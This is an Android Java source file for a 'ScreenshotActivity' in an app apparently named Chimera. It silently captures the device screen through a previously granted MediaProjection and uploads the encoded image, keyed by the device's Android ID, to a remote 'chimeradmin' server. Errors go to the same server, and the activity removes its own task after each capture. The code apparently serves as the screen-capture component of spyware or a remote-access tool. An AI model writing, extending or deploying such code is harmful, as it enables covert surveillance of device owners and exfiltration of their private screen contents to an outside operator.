package com.chimera;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenshotActivity extends AppCompatActivity {

    private static final String TAG = "ScreenshotActivity";
    private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
    private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";

    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestQueue = Volley.newRequestQueue(this);

        if (MainActivity.projectionIntent == null) {
            submitErrorToServer("Screenshot failed: Permission not granted during setup.");
            finishAndRemoveTask();
            return;
        }
        
        startCapture();
    }

    private void startCapture() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        MediaProjection mediaProjection = manager.getMediaProjection(MainActivity.projectionResultCode, MainActivity.projectionIntent);

        if (mediaProjection == null) {
            submitErrorToServer("MediaProjection could not be retrieved.");
            finishAndRemoveTask();
            return;
        }
        
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                "ChimeraScreenshot",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

        imageReader.setOnImageAvailableListener(reader -> {
            Image image = null;
            Bitmap bitmap = null;
            try {
                image = reader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    // Crop the padding out of the bitmap
                    Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                    
                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
                    String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
                    uploadFileToServer("screenshot", encodedImage);

                    croppedBitmap.recycle();
                }
            } catch (Exception e) {
                submitErrorToServer("Image processing failed: " + e.getMessage());
            } finally {
                if (bitmap != null) bitmap.recycle();
                if (image != null) image.close();
                if (virtualDisplay != null) virtualDisplay.release();
                if (mediaProjection != null) mediaProjection.stop();
                finishAndRemoveTask();
            }
        }, new Handler(Looper.getMainLooper()));
    }
    
    private void uploadFileToServer(String dataType, String base64Data) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData, r -> {}, e -> {});
            request.setRetryPolicy(new DefaultRetryPolicy(30000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            requestQueue.add(request);
        } catch (JSONException e) { /* fail silently */ }
    }

    private void submitErrorToServer(String errorMessage) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", "screenshot_error");
            postData.put("payload", errorMessage);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData, r -> {}, e -> {});
            requestQueue.add(request);
        } catch (JSONException e) { /* fail silently */ }
    }
}
